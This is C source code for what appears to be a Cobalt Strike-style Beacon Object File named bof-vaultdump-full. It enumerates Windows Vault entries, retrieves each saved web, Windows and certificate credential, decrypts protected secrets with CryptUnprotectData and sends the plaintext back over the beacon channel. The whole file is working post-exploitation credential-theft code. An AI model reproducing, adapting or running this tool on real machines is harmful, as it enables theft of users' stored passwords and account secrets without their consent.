/*
 * bof-vaultdump-full [vault-guid]
 *
 * Enumerate Windows Vault items and retrieve each item with VaultGetItem so
 * the authenticator element (the saved secret) is returned by the vault
 * service.  String and byte-array authenticators are printed; protected-array
 * elements are additionally passed through CryptUnprotectData.
 *
 * This is the fuller companion to bof-vaultdump, which only lists metadata.
 * Decryption still depends on the calling user being the vault owner.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"
#include "cryptoh.h"

static const GUID vf_web =
    {0x3ccd5499, 0x87a8, 0x4d10, {0xa2, 0x18, 0x82, 0x2e, 0xfc, 0x6a, 0xaf, 0x0c}};
static const GUID vf_win =
    {0x2f1a6504, 0x0641, 0x44cf, {0x8b, 0xb5, 0x36, 0x12, 0xd8, 0x65, 0xf2, 0xe5}};
static const GUID vf_cert =
    {0x3eba6b2b, 0xb4a5, 0x46f8, {0x9a, 0x37, 0x62, 0xc4, 0xf8, 0xa0, 0xb8, 0xf0}};

static int guid_eq(const GUID *a, const GUID *b)
{
    return bof_memcmp(a, b, sizeof(GUID)) == 0;
}

static const char *schema_name(const GUID *g)
{
    if (guid_eq(g, &vf_web)) return "Web";
    if (guid_eq(g, &vf_win)) return "Windows";
    if (guid_eq(g, &vf_cert)) return "Certificate";
    return "Unknown";
}

static void wstr(const void *p, char *out, int outsz)
{
    out[0] = 0;
    if (!p || !bof_mem_readable(p)) return;
    bof_w2a((const wchar_t *)p, out, outsz);
}

static void print_hex(const unsigned char *p, unsigned int n, int indent)
{
    static const char *h = "0123456789abcdef";
    char line[200];
    unsigned int i, o = 0;
    unsigned int shown = n > 128 ? 128 : n;

    for (i = 0; i < shown; i++) {
        line[o++] = h[(p[i] >> 4) & 0xf];
        line[o++] = h[p[i] & 0xf];
        if ((i & 15) == 15 || i + 1 == shown) {
            line[o] = 0;
            BeaconPrintf(CALLBACK_OUTPUT, "%*s%s%s\n", indent, "", line,
                         (i + 1 < n) ? " ..." : "");
            o = 0;
        }
    }
}

static void print_element(const char *label, const BOF_VAULT_ITEM_ELEMENT *el)
{
    if (!el || !bof_mem_readable(el)) return;
    switch (el->Type) {
    case BOF_VaultElementType_String: {
        char s[1024];
        wstr(el->Value.String, s, sizeof(s));
        BeaconPrintf(CALLBACK_OUTPUT, "      %-10s: %s\n", label, s);
        break;
    }
    case BOF_VaultElementType_ByteArray: {
        const unsigned char *p = el->Value.ByteArray.data;
        DWORD n = el->Value.ByteArray.size;
        unsigned int i, printable = 1;
        BeaconPrintf(CALLBACK_OUTPUT, "      %-10s: %lu bytes\n", label,
                     (unsigned long)n);
        if (!p || !bof_mem_readable(p)) break;
        for (i = 0; i < n && i < 64; i++)
            if (p[i] < 0x20 && p[i] != '\t') { printable = 0; break; }
        if (printable && n) {
            char s[512];
            unsigned int m = n < sizeof(s) - 1 ? n : sizeof(s) - 1;
            bof_memcpy(s, p, m);
            s[m] = 0;
            BeaconPrintf(CALLBACK_OUTPUT, "                 %s\n", s);
        } else {
            print_hex(p, n, 17);
        }
        break;
    }
    case BOF_VaultElementType_ProtectedArray: {
        DATA_BLOB in, out;
        const unsigned char *p = el->Value.ByteArray.data;
        DWORD n = el->Value.ByteArray.size;
        BeaconPrintf(CALLBACK_OUTPUT, "      %-10s: protected, %lu bytes\n",
                     label, (unsigned long)n);
        if (!p || !bof_mem_readable(p)) break;
        in.pbData = (BYTE *)p;
        in.cbData = n;
        bof_memzero(&out, sizeof(out));
        if (CRYPT32$CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
            BeaconPrintf(CALLBACK_OUTPUT, "      %-10s: unprotected (%lu bytes)\n",
                         label, (unsigned long)out.cbData);
            if ((out.cbData % 2) == 0 && out.cbData >= 2) {
                char s[1024];
                wchar_t w[512];
                unsigned int chars = out.cbData / 2;
                if (chars > 511) chars = 511;
                bof_memcpy(w, out.pbData, chars * 2);
                w[chars] = 0;
                bof_w2a(w, s, sizeof(s));
                BeaconPrintf(CALLBACK_OUTPUT, "                 %s\n", s);
            } else {
                print_hex(out.pbData, out.cbData, 17);
            }
            bof_memzero(out.pbData, out.cbData);
            KERNEL32$LocalFree(out.pbData);
        } else {
            print_hex(p, n, 17);
        }
        break;
    }
    default:
        BeaconPrintf(CALLBACK_OUTPUT, "      %-10s: type %d\n", label,
                     (int)el->Type);
        break;
    }
}

void go(char *args, int alen)
{
    datap parser;
    char *want = "";
    int wlen = 0;
    int vcount = 0, i, total = 0;
    GUID **vaults = NULL;

    BeaconDataParse(&parser, args, alen);
    want = BeaconDataExtract(&parser, &wlen);
    if (!want) want = "";

    if (VAULTCLI$VaultEnumerateVaults(0, &vcount, &vaults) != 0 || vcount <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "VaultEnumerateVaults failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "============ Windows Vault (full) ============\n");
    for (i = 0; i < vcount; i++) {
        HANDLE h = NULL;
        PVOID items = NULL;
        int icount = 0, j;
        char sguid[64];

        if (!vaults[i] || !bof_mem_readable(vaults[i])) continue;
        bof_guid_to_str(vaults[i], sguid, sizeof(sguid));
        if (want[0] && bof_stricmp(want, sguid) != 0 &&
            bof_stricmp(want, schema_name(vaults[i])) != 0)
            continue;

        if (VAULTCLI$VaultOpenVault(vaults[i], 0, &h) != 0 || !h) {
            BeaconPrintf(CALLBACK_OUTPUT, "\n[*] vault %s: open failed\n", sguid);
            continue;
        }
        if (VAULTCLI$VaultEnumerateItems(h, 0, &icount, &items) != 0 || !items) {
            BeaconPrintf(CALLBACK_OUTPUT, "\n[*] vault %s: no items\n", sguid);
            VAULTCLI$VaultCloseVault(&h);
            continue;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "\n=== %s vault %s: %d item(s) ===\n",
                     schema_name(vaults[i]), sguid, icount);
        for (j = 0; j < icount; j++) {
            PBOF_VAULT_ITEM_FULL it = (PBOF_VAULT_ITEM_FULL)
                ((unsigned char *)items + (unsigned int)j * sizeof(BOF_VAULT_ITEM_FULL));
            PBOF_VAULT_ITEM_FULL got = NULL;
            char friendly[512] = "";
            DWORD rc;

            if (!bof_mem_readable(it)) break;
            wstr((const void *)it->FriendlyName, friendly, sizeof(friendly));
            BeaconPrintf(CALLBACK_OUTPUT, "\n  [%d] %s\n", j + 1,
                         friendly[0] ? friendly : "(no friendly name)");
            BeaconPrintf(CALLBACK_OUTPUT, "      schema   : %s\n",
                         schema_name(&it->SchemaId));

            rc = VAULTCLI$VaultGetItem(h, &it->SchemaId, it->ResourceElement,
                                       it->IdentityElement,
                                       it->PackageSidElement, (PVOID *)&got);
            if (rc != 0 || !got) {
                BeaconPrintf(CALLBACK_OUTPUT,
                             "      authenticator: unavailable (%lu)\n",
                             (unsigned long)rc);
                continue;
            }
            print_element("resource", got->ResourceElement);
            print_element("identity", got->IdentityElement);
            print_element("secret", got->AuthenticatorElement);
            VAULTCLI$VaultFree(got);
            total++;
        }

        VAULTCLI$VaultFree(items);
        VAULTCLI$VaultCloseVault(&h);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d item(s) retrieved\n", total);
}
